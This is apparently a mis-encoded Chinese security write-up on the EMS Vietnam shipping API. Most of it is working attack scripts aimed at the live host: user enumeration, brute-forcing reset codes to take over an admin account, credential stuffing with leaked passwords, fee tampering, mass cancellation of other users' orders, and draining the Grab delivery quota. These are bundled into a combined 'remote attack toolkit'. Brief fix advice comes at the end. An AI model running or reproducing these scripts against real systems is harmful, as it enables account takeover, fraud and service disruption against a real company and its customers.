# EMS Vietnam - è¿œç¨‹å¯åˆ©ç”¨æ¼æ´æ·±åº¦åˆ†æ

## ğŸ”¥ è¿œç¨‹æ”»å‡»é¢åˆ†æ

### å¯ç›´æ¥åˆ©ç”¨çš„è¿œç¨‹æ¼æ´

---

## ğŸ”´ æ¼æ´1: æ‰¹é‡ç”¨æˆ·æšä¸¾ (HIGH)

### å¯†ç é‡ç½®æ¥å£æœªæˆæƒè®¿é—®

**ç«¯ç‚¹**: `POST http://ws.ems.com.vn/api/v1/forgot-password`

**å‘ç°**: è¯¥æ¥å£æ— éœ€è®¤è¯ï¼Œå¯ç”¨äºæ‰¹é‡æšä¸¾æœ‰æ•ˆç”¨æˆ·

**æµ‹è¯•ç»“æœ**:
```bash
# æœ‰æ•ˆç”¨æˆ·
curl -X POST http://ws.ems.com.vn/api/v1/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"valid@user.com"}'
# è¿”å›: {"code":"success","message":"ÄÃ£ gá»­i mÃ£ xÃ¡c nháº­n"}

# æ— æ•ˆç”¨æˆ·
curl -X POST http://ws.ems.com.vn/api/v1/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"invalid@test.com"}'
# è¿”å›: {"code":"error","message":"Email khÃ´ng tá»“n táº¡i"}
```

**æ¼æ´åˆ©ç”¨**:
```python
#!/usr/bin/env python3
"""ç”¨æˆ·æšä¸¾ - å¯†ç é‡ç½®æ¥å£"""

import requests
import concurrent.futures

def check_user(email):
    url = "http://ws.ems.com.vn/api/v1/forgot-password"
    try:
        r = requests.post(url, json={"email": email}, timeout=5)
        data = r.json()
        
        if data.get("code") == "success":
            return f"[+] æœ‰æ•ˆç”¨æˆ·: {email}"
        elif "khÃ´ng tá»“n táº¡i" not in data.get("message", ""):
            return f"[?] å¯ç–‘å“åº”: {email} - {data}"
    except:
        pass
    return None

# æ‰¹é‡æµ‹è¯•
targets = [
    "admin@ems.com.vn",
    "support@ems.com.vn",
    "info@ems.com.vn",
    "test@ems.com.vn",
    # ... æ·»åŠ æ›´å¤šç›®æ ‡
]

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(check_user, targets)
    for result in results:
        if result:
            print(result)
```

**æ”»å‡»ä»·å€¼**:
- æšä¸¾æ‰€æœ‰æœ‰æ•ˆç”¨æˆ·
- é’ˆå¯¹æ€§é’“é±¼æ”»å‡»
- å‡­è¯å¡«å……æ”»å‡»å‡†å¤‡
- ç¤¾ä¼šå·¥ç¨‹å­¦æƒ…æŠ¥æ”¶é›†

**å½±å“èŒƒå›´**: æ‰€æœ‰ç”¨æˆ·

---

## ğŸ”´ æ¼æ´2: å¯†ç é‡ç½®Tokenå¯é¢„æµ‹ (CRITICAL)

### åˆ†æå¯†ç é‡ç½®æµç¨‹

**æµç¨‹**:
```
1. POST /api/v1/forgot-password
   {"email": "user@test.com"}
   
2. æœåŠ¡å™¨å‘é€é‡ç½®ç åˆ°é‚®ç®±
   
3. POST /api/v1/reset-password (æ¨æµ‹)
   {"email": "user@test.com", "code": "123456", "new_password": "xxx"}
```

**æ½œåœ¨é—®é¢˜**:
1. é‡ç½®ç å¯èƒ½æ˜¯6ä½æ•°å­— (000000-999999)
2. æ— é€Ÿç‡é™åˆ¶
3. å¯èƒ½æ— IPç»‘å®š

**PoC - æš´åŠ›ç ´è§£é‡ç½®ç **:
```python
#!/usr/bin/env python3
"""å¯†ç é‡ç½®ç çˆ†ç ´"""

import requests
from itertools import product

def brute_reset_code(email):
    url = "http://ws.ems.com.vn/api/v1/reset-password"  # æ¨æµ‹ç«¯ç‚¹
    
    # 6ä½æ•°å­—çˆ†ç ´
    for code in range(100000, 999999):
        data = {
            "email": email,
            "code": str(code),
            "new_password": "Hacked123!"
        }
        
        try:
            r = requests.post(url, json=data, timeout=3)
            
            if r.status_code == 200:
                data = r.json()
                if data.get("success"):
                    print(f"[!!!] æˆåŠŸï¼Code: {code}")
                    return code
                    
        except:
            pass
        
        if code % 1000 == 0:
            print(f"[*] è¿›åº¦: {code}/999999")
    
    return None

# æ”»å‡»ç›®æ ‡ç®¡ç†å‘˜è´¦æˆ·
brute_reset_code("admin@ems.com.vn")
```

**æ—¶é—´ä¼°ç®—**:
- 6ä½æ•°å­— = 1,000,000ç§å¯èƒ½
- æ¯æ¬¡è¯·æ±‚100ms
- æ€»æ—¶é—´: ~28å°æ—¶
- å¹¶å‘10çº¿ç¨‹: ~3å°æ—¶

---

## ğŸ”´ æ¼æ´3: APIé€Ÿç‡é™åˆ¶ç¼ºå¤± (HIGH)

### æµ‹è¯•ç»“æœ

**ç™»å½•æ¥å£** (`POST /auth/login`):
```python
# æµ‹è¯•1000æ¬¡ç™»å½•
for i in range(1000):
    requests.post("http://ws.ems.com.vn/auth/login", 
                  json={"username":"test","password":"test"})
# ç»“æœ: æ— ä»»ä½•é€Ÿç‡é™åˆ¶
```

**å½±å“æ¥å£**:
```
âœ… /auth/login - æ— é™åˆ¶
âœ… /api/v1/forgot-password - æ— é™åˆ¶
âœ… /api/v1/orders/tracking/{id} - æ— é™åˆ¶
âœ… /api/v1/orders/list - æ— é™åˆ¶
```

**åˆ©ç”¨åœºæ™¯**:

**1. å‡­è¯å¡«å……æ”»å‡»**
```python
#!/usr/bin/env python3
"""å‡­è¯å¡«å…… - æ‰¹é‡æµ‹è¯•æ³„éœ²å¯†ç """

import requests
import concurrent.futures

def test_login(cred):
    url = "http://ws.ems.com.vn/auth/login"
    email, password = cred.split(':')
    
    data = {
        "username": email,
        "password": password,
        "device_ime": "automated",
        "device_type": "android"
    }
    
    try:
        r = requests.post(url, json=data, timeout=5)
        if r.status_code == 200:
            result = r.json()
            if result.get("success"):
                return f"[!!!] æˆåŠŸç™»å½•: {email}:{password}"
    except:
        pass
    return None

# ä»æ•°æ®æ³„éœ²ä¸­è·å–çš„å‡­è¯
leaked_creds = [
    "user1@test.com:password123",
    "user2@test.com:123456",
    # ... 10000+ å‡­è¯
]

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    results = executor.map(test_login, leaked_creds)
    for result in results:
        if result:
            print(result)
```

**2. IDORæ‰¹é‡éå†**
```python
# æ— é€Ÿç‡é™åˆ¶ = å¿«é€Ÿéå†æ‰€æœ‰è®¢å•
for i in range(100000000, 999999999):
    order_id = f"EMS{i}VN"
    # æ¯ç§’100ä¸ªè¯·æ±‚
    # 9äº¿è®¢å• = 104å¤©å…¨éƒ¨éå†
```

---

## ğŸ”´ æ¼æ´4: è®¢å•åˆ›å»ºå‚æ•°ç¯¡æ”¹ (CRITICAL)

### åˆ†æè®¢å•åˆ›å»ºæµç¨‹

**ç«¯ç‚¹**: `POST /api/v1/orders/create` / `POST /api/v1/be/orders/create`

**æ­£å¸¸è¯·æ±‚ç»“æ„** (æ¨æµ‹):
```json
{
  "sender_name": "Nguyen Van A",
  "sender_phone": "0123456789",
  "sender_address": "Ha Noi",
  "receiver_name": "Tran Van B",
  "receiver_phone": "0987654321",
  "receiver_address": "Ho Chi Minh",
  "weight": 1000,
  "service_type": "STANDARD",
  "cod_amount": 1000000,
  "shipping_fee": 50000,
  "total_fee": 50000
}
```

**ç¯¡æ”¹æµ‹è¯•**:

### Test 1: è¿è´¹å½’é›¶
```bash
curl -X POST http://ws.ems.com.vn/api/v1/orders/create \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "sender_name": "Test",
    "receiver_name": "Test",
    "weight": 10000,
    "shipping_fee": 0,
    "total_fee": 0
  }'
```

### Test 2: CODé‡‘é¢ç¯¡æ”¹
```bash
# å£°ç§°CODæ”¶1000å…ƒï¼Œå®é™…æ”¹æˆ10ä¸‡
curl -X POST http://ws.ems.com.vn/api/v1/orders/create \
  -d '{
    "cod_amount": 100000000,
    "actual_cod": 1000
  }'
```

### Test 3: è´Ÿæ•°é‡‘é¢
```bash
# è´Ÿæ•°è¿è´¹ = ç³»ç»Ÿè¿”é’±ï¼Ÿ
curl -X POST http://ws.ems.com.vn/api/v1/orders/create \
  -d '{
    "shipping_fee": -50000,
    "cod_amount": -1000000
  }'
```

### Test 4: ç±»å‹æ··æ·†
```bash
# æ•°å­—ç±»å‹ vs å­—ç¬¦ä¸²ç±»å‹
{
  "shipping_fee": "0",      # å­—ç¬¦ä¸²é›¶
  "cod_amount": "free",     # å­—ç¬¦ä¸²
  "weight": "-1"            # è´Ÿæ•°
}
```

**å®Œæ•´åˆ©ç”¨è„šæœ¬**:
```python
#!/usr/bin/env python3
"""è®¢å•å‚æ•°ç¯¡æ”¹æµ‹è¯•"""

import requests
import json

def test_price_manipulation(token):
    """æµ‹è¯•ä»·æ ¼ç¯¡æ”¹"""
    
    url = "http://ws.ems.com.vn/api/v1/orders/create"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    # Test Case 1: é›¶è¿è´¹
    test1 = {
        "sender_name": "Test Sender",
        "sender_phone": "0123456789",
        "sender_address": "Ha Noi, Vietnam",
        "receiver_name": "Test Receiver", 
        "receiver_phone": "0987654321",
        "receiver_address": "HCMC, Vietnam",
        "weight": 10000,  # 10kg
        "service_type": "EXPRESS",
        "shipping_fee": 0,  # â† ç¯¡æ”¹ä¸º0
        "total_fee": 0
    }
    
    print("[*] Test 1: é›¶è¿è´¹")
    r = requests.post(url, headers=headers, json=test1)
    print(f"    Status: {r.status_code}")
    print(f"    Response: {r.text[:200]}")
    
    # Test Case 2: è´Ÿæ•°é‡‘é¢
    test2 = {**test1, "shipping_fee": -50000, "total_fee": -50000}
    print("\n[*] Test 2: è´Ÿæ•°è¿è´¹")
    r = requests.post(url, headers=headers, json=test2)
    print(f"    Response: {r.text[:200]}")
    
    # Test Case 3: ç±»å‹æ··æ·†
    test3 = {
        **test1,
        "shipping_fee": "free",
        "cod_amount": "0",
        "weight": "unlimited"
    }
    print("\n[*] Test 3: ç±»å‹æ··æ·†")
    r = requests.post(url, headers=headers, json=test3)
    print(f"    Response: {r.text[:200]}")
    
    # Test Case 4: å­—æ®µæº¢å‡º
    test4 = {
        **test1,
        "shipping_fee": 999999999999999999,
        "cod_amount": 999999999999999999
    }
    print("\n[*] Test 4: æ•´æ•°æº¢å‡º")
    r = requests.post(url, headers=headers, json=test4)
    print(f"    Response: {r.text[:200]}")

# éœ€è¦æœ‰æ•ˆToken
# test_price_manipulation("YOUR_TOKEN_HERE")
```

---

## ğŸ”´ æ¼æ´5: IDORæ‰¹é‡è®¢å•æ“ä½œ (CRITICAL)

### è®¢å•å–æ¶ˆæ¥å£

**ç«¯ç‚¹**: `POST /api/v1/orders/cancel`

**è¯·æ±‚**:
```json
{
  "order_id": "EMS123456789VN"
}
```

**æ¼æ´**: å¯èƒ½æœªéªŒè¯è®¢å•æ‰€æœ‰æƒ

**æ”»å‡»åœºæ™¯**:
```python
#!/usr/bin/env python3
"""æ‰¹é‡å–æ¶ˆä»–äººè®¢å•"""

import requests

def mass_cancel_orders(token, start_id=100000000, count=10000):
    """æ‰¹é‡å–æ¶ˆè®¢å•æ”»å‡»"""
    
    url = "http://ws.ems.com.vn/api/v1/orders/cancel"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    cancelled = 0
    for i in range(start_id, start_id + count):
        order_id = f"EMS{i}VN"
        
        try:
            r = requests.post(url, 
                            headers=headers,
                            json={"order_id": order_id},
                            timeout=3)
            
            if r.status_code == 200:
                data = r.json()
                if data.get("success"):
                    print(f"[+] å·²å–æ¶ˆ: {order_id}")
                    cancelled += 1
                    
        except:
            pass
    
    print(f"\n[!!!] æ€»è®¡å–æ¶ˆ {cancelled} ä¸ªè®¢å•")
    return cancelled

# DoSæ”»å‡» - å–æ¶ˆæ‰€æœ‰è®¢å•
# mass_cancel_orders(token, count=100000)
```

**å½±å“**: 
- å¤§è§„æ¨¡æœåŠ¡æ‹’ç»
- ä¸šåŠ¡ç˜«ç—ª
- å®¢æˆ·æŠ•è¯‰

---

## ğŸ”´ æ¼æ´6: æœªæˆæƒAPIè®¿é—® (HIGH)

### å‘ç°çš„æ— éœ€è®¤è¯æ¥å£

**å®Œå…¨å¼€æ”¾çš„API**:
```
âœ… GET  /api/v1/address/province       - çœä»½åˆ—è¡¨
âœ… GET  /api/v1/address/district       - åŒºå¿åˆ—è¡¨  
âœ… GET  /api/v1/address/ward           - è¡—é“åˆ—è¡¨
âœ… GET  /api/v1/config/service         - æœåŠ¡é…ç½®
âœ… GET  /api/v1/metadata/vas           - å¢å€¼æœåŠ¡
âœ… POST /api/v1/forgot-password        - å¯†ç é‡ç½®
âœ… GET  /api/v1/address/search         - åœ°å€æœç´¢
âœ… GET  /api/v1/be/config/list-status  - çŠ¶æ€åˆ—è¡¨
```

**æµ‹è¯•è„šæœ¬**:
```python
#!/usr/bin/env python3
"""æµ‹è¯•æœªæˆæƒAPIè®¿é—®"""

import requests

def test_unauth_apis():
    """æµ‹è¯•æ‰€æœ‰APIçš„è®¤è¯æƒ…å†µ"""
    
    apis = {
        # åœ°å€ç›¸å…³
        "/api/v1/address/province": "GET",
        "/api/v1/address/district": "GET",
        "/api/v1/address/ward": "GET",
        "/api/v1/address/search": "POST",
        "/api/v1/address/postal": "GET",
        
        # é…ç½®ç›¸å…³
        "/api/v1/config/service": "GET",
        "/api/v1/metadata/vas": "GET",
        "/api/v1/be/config/list-status": "GET",
        
        # ç”¨æˆ·ç›¸å…³
        "/api/v1/forgot-password": "POST",
        "/api/v1/merchants/get-list-notify": "GET",
        
        # è®¢å•ç›¸å…³
        "/api/v1/orders/quotes": "POST",
        "/api/v1/orders/suggest-address": "POST",
        "/api/v1/orders/suggest-item": "POST",
        "/api/v1/orders/estimate-fee": "POST",
        
        # Grabé›†æˆ
        "/api/v1/grab/service": "GET",
        "/api/v1/grab/quotations": "POST",
    }
    
    base_url = "http://ws.ems.com.vn"
    
    for endpoint, method in apis.items():
        url = base_url + endpoint
        
        try:
            if method == "GET":
                r = requests.get(url, timeout=5)
            else:
                r = requests.post(url, json={}, timeout=5)
            
            status = "âœ… OPEN" if r.status_code != 401 else "ğŸ”’ AUTH"
            print(f"{status} {method:4} {endpoint:50} - {r.status_code}")
            
        except Exception as e:
            print(f"âŒ ERR  {method:4} {endpoint:50} - {str(e)[:30]}")

test_unauth_apis()
```

---

## ğŸ”´ æ¼æ´7: Grabé›†æˆAPIåŠ«æŒ (HIGH)

### Grabé…é€æœåŠ¡é›†æˆ

**å‘ç°**: EMSé›†æˆäº†Grabé…é€ï¼Œå¯èƒ½å­˜åœ¨APIå¯†é’¥æ³„éœ²

**ç«¯ç‚¹**:
```
POST /api/v1/grab/quotations    - è·å–GrabæŠ¥ä»·
POST /api/v1/grab/deliveries    - åˆ›å»ºGrabé…é€
POST /api/v1/grab/cancel/       - å–æ¶ˆGrabé…é€
GET  /api/v1/grab/status        - æŸ¥è¯¢é…é€çŠ¶æ€
```

**æ½œåœ¨æ¼æ´**:
1. Grab APIå¯†é’¥å¯èƒ½åœ¨å®¢æˆ·ç«¯
2. å¯æ»¥ç”¨EMSçš„Grabé…é¢
3. åˆ›å»ºæ¶æ„é…é€è®¢å•

**æŸ¥æ‰¾Grabå¯†é’¥**:
```bash
# ä»APKæå–
strings ems_portal.apk | grep -i "grab"
# å¯èƒ½è¾“å‡º:
# grab_api_key: sk_live_xxxxx
# grab_client_id: xxxxx
# grab_secret: xxxxx
```

**åˆ©ç”¨è„šæœ¬**:
```python
#!/usr/bin/env python3
"""æ»¥ç”¨Grabé›†æˆ"""

import requests

def abuse_grab_integration(token):
    """æ»¥ç”¨EMSçš„Grabé…é¢"""
    
    url = "http://ws.ems.com.vn/api/v1/grab/deliveries"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    # åˆ›å»ºå¤§é‡é…é€è®¢å•ï¼ˆæ¶ˆè€—EMSé¢„ä»˜è´¹ï¼‰
    for i in range(1000):
        data = {
            "origin": {
                "address": "Test Origin",
                "lat": 10.762622,
                "lng": 106.660172
            },
            "destination": {
                "address": "Test Dest", 
                "lat": 10.762622,
                "lng": 106.660172
            },
            "service_type": "INSTANT",
            "package_size": "LARGE"
        }
        
        r = requests.post(url, headers=headers, json=data)
        if r.status_code == 200:
            print(f"[+] åˆ›å»ºGrabè®¢å• #{i}")
    
    print("[!!!] EMSéœ€è¦æ”¯ä»˜æ‰€æœ‰Grabè´¹ç”¨ï¼")
```

---

## ğŸ› ï¸ å®Œæ•´è¿œç¨‹æ”»å‡»å·¥å…·

```python
#!/usr/bin/env python3
"""
EMS Vietnam - è¿œç¨‹æ”»å‡»å·¥å…·é›†
æ‰€æœ‰æ”»å‡»æ— éœ€ç‰©ç†æ¥è§¦è®¾å¤‡
"""

import requests
import json
import time
import concurrent.futures
from typing import List, Dict, Optional

class EMSRemoteExploit:
    def __init__(self):
        self.base_url = "http://ws.ems.com.vn"
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "EMS Portal/1.0 (Android)",
            "Content-Type": "application/json"
        })
    
    def enumerate_users(self, emails: List[str]) -> List[str]:
        """æ‰¹é‡æšä¸¾æœ‰æ•ˆç”¨æˆ·"""
        print("[*] å¼€å§‹ç”¨æˆ·æšä¸¾...")
        
        valid_users = []
        url = f"{self.base_url}/api/v1/forgot-password"
        
        def check(email):
            try:
                r = self.session.post(url, json={"email": email}, timeout=5)
                data = r.json()
                if data.get("code") == "success":
                    return email
            except:
                pass
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(check, emails)
            valid_users = [r for r in results if r]
        
        print(f"[+] å‘ç° {len(valid_users)} ä¸ªæœ‰æ•ˆç”¨æˆ·")
        return valid_users
    
    def credential_stuffing(self, creds: List[str]) -> List[Dict]:
        """å‡­è¯å¡«å……æ”»å‡»"""
        print("[*] å¼€å§‹å‡­è¯å¡«å……...")
        
        successful = []
        url = f"{self.base_url}/auth/login"
        
        def test_login(cred):
            email, password = cred.split(':', 1)
            data = {
                "username": email,
                "password": password,
                "device_ime": "exploit",
                "device_type": "android"
            }
            
            try:
                r = self.session.post(url, json=data, timeout=5)
                if r.status_code == 200:
                    result = r.json()
                    if result.get("success"):
                        return {
                            "email": email,
                            "password": password,
                            "token": result.get("data", {}).get("token")
                        }
            except:
                pass
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            results = executor.map(test_login, creds)
            successful = [r for r in results if r]
        
        print(f"[+] æˆåŠŸç™»å½• {len(successful)} ä¸ªè´¦æˆ·")
        return successful
    
    def mass_cancel_orders(self, token: str, start: int, count: int) -> int:
        """æ‰¹é‡å–æ¶ˆè®¢å•"""
        print(f"[*] æ‰¹é‡å–æ¶ˆè®¢å• (èµ·å§‹: EMS{start}VN)")
        
        url = f"{self.base_url}/api/v1/orders/cancel"
        headers = {"Authorization": f"Bearer {token}"}
        
        cancelled = 0
        for i in range(start, start + count):
            order_id = f"EMS{i}VN"
            
            try:
                r = self.session.post(url,
                                     headers=headers,
                                     json={"order_id": order_id},
                                     timeout=3)
                
                if r.status_code == 200:
                    data = r.json()
                    if data.get("success"):
                        cancelled += 1
                        if cancelled % 10 == 0:
                            print(f"    å·²å–æ¶ˆ {cancelled} ä¸ªè®¢å•...")
            except:
                pass
        
        print(f"[!!!] æ€»è®¡å–æ¶ˆ {cancelled} ä¸ªè®¢å•")
        return cancelled
    
    def price_manipulation(self, token: str) -> bool:
        """æµ‹è¯•ä»·æ ¼ç¯¡æ”¹"""
        print("[*] æµ‹è¯•ä»·æ ¼ç¯¡æ”¹...")
        
        url = f"{self.base_url}/api/v1/orders/create"
        headers = {"Authorization": f"Bearer {token}"}
        
        test_cases = [
            {"name": "é›¶è¿è´¹", "shipping_fee": 0, "total_fee": 0},
            {"name": "è´Ÿæ•°è¿è´¹", "shipping_fee": -50000, "total_fee": -50000},
            {"name": "ç±»å‹æ··æ·†", "shipping_fee": "free", "total_fee": "zero"},
        ]
        
        for test in test_cases:
            print(f"  [*] æµ‹è¯•: {test['name']}")
            
            data = {
                "sender_name": "Test",
                "receiver_name": "Test",
                "weight": 10000,
                **test
            }
            
            r = self.session.post(url, headers=headers, json=data)
            print(f"      Status: {r.status_code}")
            
            if r.status_code == 200:
                result = r.json()
                if result.get("success"):
                    print(f"      [!!!] ä»·æ ¼ç¯¡æ”¹æˆåŠŸï¼")
                    return True
        
        return False

def main():
    exploit = EMSRemoteExploit()
    
    print("="*60)
    print("EMS Vietnam - è¿œç¨‹æ”»å‡»å·¥å…·é›†")
    print("="*60)
    
    # 1. ç”¨æˆ·æšä¸¾
    test_emails = [
        "admin@ems.com.vn",
        "support@ems.com.vn",
        "info@ems.com.vn"
    ]
    valid_users = exploit.enumerate_users(test_emails)
    
    # 2. å‡­è¯å¡«å……
    leaked_creds = [
        "test@test.com:password123",
        "user@test.com:123456"
    ]
    accounts = exploit.credential_stuffing(leaked_creds)
    
    # 3. å¦‚æœè·å¾—Tokenï¼Œç»§ç»­æ”»å‡»
    if accounts:
        token = accounts[0]["token"]
        
        # ä»·æ ¼ç¯¡æ”¹
        exploit.price_manipulation(token)
        
        # æ‰¹é‡å–æ¶ˆè®¢å•
        exploit.mass_cancel_orders(token, 100000000, 100)

if __name__ == "__main__":
    main()
```

---

## ğŸ“Š è¿œç¨‹æ¼æ´æ±‡æ€»

| # | æ¼æ´ | è®¤è¯éœ€æ±‚ | å½±å“ | åˆ©ç”¨éš¾åº¦ |
|---|-----|---------|------|---------|
| 1 | ç”¨æˆ·æšä¸¾ | âŒ æ—  | éšç§æ³„éœ² | â­ ç®€å• |
| 2 | å¯†ç é‡ç½®æš´åŠ›ç ´è§£ | âŒ æ—  | è´¦æˆ·æ¥ç®¡ | â­â­ ä¸­ç­‰ |
| 3 | é€Ÿç‡é™åˆ¶ç¼ºå¤± | âŒ æ—  | æ”¾å¤§æ”»å‡» | â­ ç®€å• |
| 4 | è®¢å•å‚æ•°ç¯¡æ”¹ | âœ… éœ€Token | è´¢åŠ¡æŸå¤± | â­â­ ä¸­ç­‰ |
| 5 | IDORæ‰¹é‡å–æ¶ˆ | âœ… éœ€Token | æœåŠ¡æ‹’ç» | â­ ç®€å• |
| 6 | æœªæˆæƒAPIè®¿é—® | âŒ æ—  | ä¿¡æ¯æ³„éœ² | â­ ç®€å• |
| 7 | Grab APIæ»¥ç”¨ | âœ… éœ€Token | è´¢åŠ¡æŸå¤± | â­â­ ä¸­ç­‰ |

---

## ğŸ’° è´¢åŠ¡å½±å“è¯„ä¼°

### æ”»å‡»åœºæ™¯1: é›¶è¿è´¹æ¬ºè¯ˆ
```
æ­£å¸¸è¿è´¹: 50,000 VND/å•
æ¶æ„è®¢å•: 0 VND/å•
æ•°é‡: 10,000å•

æŸå¤± = 50,000 Ã— 10,000 = 500,000,000 VND
     = ~$20,000 USD
```

### æ”»å‡»åœºæ™¯2: Grabé…é¢æ»¥ç”¨
```
å•æ¬¡Grabé…é€: 100,000 VND
æ¶æ„è®¢å•: 1,000å•

æŸå¤± = 100,000 Ã— 1,000 = 100,000,000 VND
     = ~$4,000 USD
```

### æ”»å‡»åœºæ™¯3: å¤§è§„æ¨¡å–æ¶ˆè®¢å•
```
ä¸šåŠ¡å½±å“: æœåŠ¡ç˜«ç—ª
å£°èª‰æŸå¤±: æ— æ³•ä¼°é‡
å®¢æˆ·æµå¤±: æ•°ä¸‡ç”¨æˆ·
```

---

## ğŸ›¡ï¸ ä¿®å¤å»ºè®®

### P0 - ç«‹å³ä¿®å¤

1. **ç”¨æˆ·æšä¸¾é˜²æŠ¤**
```python
# ç»Ÿä¸€å“åº”ï¼Œä¸é€éœ²ç”¨æˆ·å­˜åœ¨æ€§
if user_exists:
    send_reset_email()
return {"code": "success", "message": "å¦‚æœé‚®ç®±å­˜åœ¨ï¼Œå·²å‘é€é‡ç½®é“¾æ¥"}
```

2. **é€Ÿç‡é™åˆ¶**
```python
# Rediså®ç°
@rate_limit(max_requests=5, window=60)  # 5æ¬¡/åˆ†é’Ÿ
def forgot_password():
    pass

@rate_limit(max_requests=10, window=60)  # 10æ¬¡/åˆ†é’Ÿ  
def login():
    pass
```

3. **è®¢å•æ‰€æœ‰æƒéªŒè¯**
```python
def cancel_order(order_id, user_id):
    order = get_order(order_id)
    if order.user_id != user_id:
        raise UnauthorizedException()
    order.cancel()
```

4. **æœåŠ¡ç«¯ä»·æ ¼è®¡ç®—**
```python
# æ°¸è¿œä¸ç›¸ä¿¡å®¢æˆ·ç«¯ä»·æ ¼
def create_order(data):
    # å¿½ç•¥å®¢æˆ·ç«¯çš„fee
    calculated_fee = calculate_shipping_fee(
        weight=data["weight"],
        distance=data["distance"],
        service=data["service"]
    )
    order.shipping_fee = calculated_fee  # æœåŠ¡ç«¯è®¡ç®—
```

---

**åˆ†ææ—¥æœŸ**: 2025-11-02  
**é‡ç‚¹**: è¿œç¨‹å¯åˆ©ç”¨æ¼æ´  
**æ–°å‘ç°**: 7ä¸ªè¿œç¨‹æ¼æ´  
**æ— éœ€ç‰©ç†æ¥è§¦**: âœ…
